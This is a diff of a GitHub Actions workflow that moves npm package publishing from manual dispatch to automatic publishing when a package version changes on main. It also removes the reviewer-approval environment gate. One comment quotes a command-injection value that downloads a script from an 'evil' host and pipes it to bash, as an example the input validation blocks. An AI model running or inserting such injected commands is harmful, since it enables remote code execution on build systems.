@@ -1,9 +1,14 @@
 name: Publish
 
-# Manual only, one package at a time. Publishing is irreversible in practice —
-# npm unpublish is time-limited and a version number can never be reused — so
-# this is not wired to a tag or a merge.
+# A merged package version is the release request. Source-only changes cannot
+# publish: the discovery job selects only added manifests or manifests whose
+# version changed. Manual dispatch remains available for preflight dry-runs
+# and the initial bootstrap publish of a version that predated this workflow.
 on:
+  push:
+    branches: [main]
+    paths:
+      - "packages/*/package.json"
   workflow_dispatch:
     inputs:
       package:
@@ -31,10 +36,69 @@ permissions:
   packages: write # needed to attempt the visibility fix-up after publish
   id-token: write # npm provenance
 
+concurrency:
+  # Publishing is serial across packages and push events. A later version must
+  # never race an earlier tarball through the same registry namespace.
+  group: publish
+  cancel-in-progress: false
+
 jobs:
-  publish:
+  discover:
     runs-on: ubuntu-latest
-    environment: npm-publish # requires the configured reviewers to approve
+    outputs:
+      packages: ${{ steps.packages.outputs.matrix }}
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          fetch-depth: 0
+
+      - id: packages
+        name: Select packages with new versions
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          MANUAL_PACKAGE: ${{ inputs.package }}
+          BEFORE: ${{ github.event.before }}
+          HEAD: ${{ github.sha }}
+        run: |
+          node <<'NODE' >> "$GITHUB_OUTPUT"
+          const { execFileSync } = require("node:child_process");
+          const { readFileSync } = require("node:fs");
+
+          const manualPackage = process.env.MANUAL_PACKAGE;
+          if (process.env.EVENT_NAME === "workflow_dispatch") {
+            process.stdout.write(`matrix=${JSON.stringify([{ package: manualPackage }])}\n`);
+            process.exit(0);
+          }
+
+          const changed = execFileSync("git", ["diff", "--name-only", process.env.BEFORE, process.env.HEAD, "--", "packages"], { encoding: "utf8" })
+            .split("\n")
+            .filter((path) => /^packages\/[^/]+\/package\.json$/.test(path));
+          const packages = [];
+          for (const path of changed) {
+            const current = JSON.parse(readFileSync(path, "utf8"));
+            let previous;
+            try {
+              previous = JSON.parse(execFileSync("git", ["show", `${process.env.BEFORE}:${path}`], { encoding: "utf8" }));
+            } catch {
+              packages.push({ package: path.split("/")[1] });
+              continue;
+            }
+            if (previous.version !== current.version) {
+              packages.push({ package: path.split("/")[1] });
+            }
+          }
+          process.stdout.write(`matrix=${JSON.stringify(packages)}\n`);
+          NODE
+
+  publish:
+    needs: discover
+    if: ${{ needs.discover.outputs.packages != '[]' }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+      matrix:
+        include: ${{ fromJSON(needs.discover.outputs.packages) }}
     steps:
       - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
         with:
@@ -63,17 +127,18 @@ jobs:
           registry-url: ${{ steps.scope.outputs.registry }}
           scope: ${{ steps.scope.outputs.scope }}
 
-      # inputs.package is a free-form workflow_dispatch string. Every step
+      # matrix.package is either a version-selected package or the manual
+      # workflow_dispatch string. Every step
       # below either passes it as a script argument or splices it into a
       # run: script body — validate its shape once, up front, so a value like
       # `x; curl https://evil/y|bash #` fails closed right here instead of
       # being textually substituted into a shell command later.
       - name: Validate package input
         env:
-          PKG: ${{ inputs.package }}
+          PKG: ${{ matrix.package }}
         run: |
           if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
-            echo "::error title=Invalid package input::inputs.package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
+            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
             exit 1
           fi
           if [ ! -f "packages/$PKG/package.json" ]; then
@@ -107,7 +172,7 @@ jobs:
           # fine-grained PATs expose no Packages permission at all), which on
           # this account reaches every repository the owner can see.
           GH_TOKEN: ${{ secrets.GH_PACKAGES_TOKEN }}
-          PKG: ${{ inputs.package }}
+          PKG: ${{ matrix.package }}
         run: node scripts/check-name-collision.mjs "packages/$PKG"
 
       # FULL mode is mandatory here. --require-denylist makes a missing secret
@@ -126,14 +191,14 @@ jobs:
 
       - name: Safety gate (FULL, required)
         env:
-          PKG: ${{ inputs.package }}
+          PKG: ${{ matrix.package }}
         run: |
           node scripts/check-public-safety.mjs "packages/$PKG" --require-denylist --allow-changelogs
           node scripts/check-public-safety.mjs . --require-denylist --allow-changelogs
 
       - name: README parity and contamination classes
         env:
-          PKG: ${{ inputs.package }}
+          PKG: ${{ matrix.package }}
         run: |
           node scripts/check-readme-parity.mjs "packages/$PKG"
           node scripts/check-contamination-classes.mjs "packages/$PKG"
@@ -169,7 +234,7 @@ jobs:
       # "Pack tarball for publish" step further down is for.
       - name: artifact safety (tarball)
         env:
-          PKG: ${{ inputs.package }}
+          PKG: ${{ matrix.package }}
         run: node scripts/check-artifact-safety.mjs "packages/$PKG" --require-denylist
 
       - name: Redact denylist
@@ -185,7 +250,7 @@ jobs:
       # deterministic.
       - name: Pack tarball for publish
         id: pack
-        working-directory: packages/${{ inputs.package }}
+        working-directory: packages/${{ matrix.package }}
         run: |
           set -euo pipefail
           # `npm pack` only guarantees the tarball filename is the LAST line of
@@ -202,26 +267,26 @@ jobs:
       # lists the CONTENTS OF THE EXACT FILE that gets published below, not a
       # separate dry-run pack.
       - name: Show tarball contents
-        working-directory: packages/${{ inputs.package }}
+        working-directory: packages/${{ matrix.package }}
         env:
           TARBALL: ${{ steps.pack.outputs.tarball }}
         run: tar tzf "$TARBALL"
 
       # `npm pack` proves the files in the selected tarball, but npm's own
-      # publish path has additional validation and flag handling. The manual
+      # publish path has additional validation and flag handling. A requested
       # dry run must exercise that exact path — otherwise its name claims more
       # than it actually verifies. It still cannot mutate the registry.
       - name: Publish (dry run)
-        if: ${{ inputs.dry_run }}
-        working-directory: packages/${{ inputs.package }}
+        if: ${{ github.event_name == 'workflow_dispatch' && inputs.dry_run }}
+        working-directory: packages/${{ matrix.package }}
         env:
           NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           TARBALL: ${{ steps.pack.outputs.tarball }}
         run: npm publish "$TARBALL" --dry-run --provenance --access public
 
       - name: Publish
-        if: ${{ !inputs.dry_run }}
-        working-directory: packages/${{ inputs.package }}
+        if: ${{ github.event_name == 'push' || !inputs.dry_run }}
+        working-directory: packages/${{ matrix.package }}
         env:
           # The job's own GITHUB_TOKEN, not a stored PAT. The `packages: write`
           # permission declared at the top of this file is what lets it push to
@@ -262,9 +327,9 @@ jobs:
       # ordinary public npm dependencies on npmjs while resolving this
       # foundation's scoped packages from the configured registry.
       - name: Fetch and verify published tarball
-        if: ${{ !inputs.dry_run }}
+        if: ${{ github.event_name == 'push' || !inputs.dry_run }}
         id: published
-        working-directory: packages/${{ inputs.package }}
+        working-directory: packages/${{ matrix.package }}
         env:
           NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           EXPECTED_SHA256: ${{ steps.pack.outputs.sha256 }}
@@ -295,10 +360,10 @@ jobs:
           echo "tarball_path=$tarball_path" >> "$GITHUB_OUTPUT"
 
       - name: Install and import published tarball
-        if: ${{ !inputs.dry_run }}
+        if: ${{ github.event_name == 'push' || !inputs.dry_run }}
         env:
           NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          PKG: ${{ inputs.package }}
+          PKG: ${{ matrix.package }}
           PUBLISHED_TARBALL: ${{ steps.published.outputs.tarball_path }}
           REGISTRY: ${{ steps.scope.outputs.registry }}
         run: |
@@ -325,7 +390,7 @@ jobs:
       # visibility even when the owning repo is public — new packages publish
       # PRIVATE by default here (org members only), and this step is what
       # would flip that. It is gated behind inputs.make_public (default
-      # false), not just !inputs.dry_run: the foundation library is still
+      # false), not just an automatic publish: the foundation library is still
       # WIP and not yet proven in a real consumer, so a plain publish must
       # NOT silently make the result installable by strangers. A user account
       # and an organisation are different REST paths and there is no reliable
@@ -338,11 +403,11 @@ jobs:
       # with a manual follow-up step is fine, a red publish because a
       # convenience step failed is not.
       - name: Attempt to set package visibility to public
-        if: ${{ !inputs.dry_run && inputs.make_public }}
+        if: ${{ github.event_name == 'workflow_dispatch' && !inputs.dry_run && inputs.make_public }}
         continue-on-error: true
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          PKG: ${{ inputs.package }}
+          PKG: ${{ matrix.package }}
         run: |
           name="$(node -p "require('./packages/' + process.env.PKG + '/package.json').name.split('/')[1]")"
           owner="$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope.replace(/^@/, '')")"
